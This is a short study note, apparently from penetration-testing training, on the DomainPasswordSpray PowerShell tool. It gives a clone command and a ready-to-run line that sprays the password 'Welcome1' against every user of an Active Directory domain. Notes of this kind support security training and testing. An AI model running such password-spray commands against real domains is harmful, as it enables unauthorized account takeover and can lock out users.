domainPasswordSpray
###################

Date: 2024-12-19 13:24:50

Status: #complete

Tags: :ref:`Active Directory Enumeration Attacks`

Description
***********

DomainPasswordSpray is a tool written in PowerShell to perform a password spray attack against users of a domain. By default it will automatically generate the userlist from the domain. BE VERY CAREFUL NOT TO LOCKOUT ACCOUNTS!

Installation
************

.. code-block:: console

    git clone https://github.com/dafthack/DomainPasswordSpray

Usage
******

.. code-block:: console

    PS C:\htb> Import-Module .\DomainPasswordSpray.ps1
    PS C:\htb> Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue




References
**********
https://github.com/dafthack/DomainPasswordSpray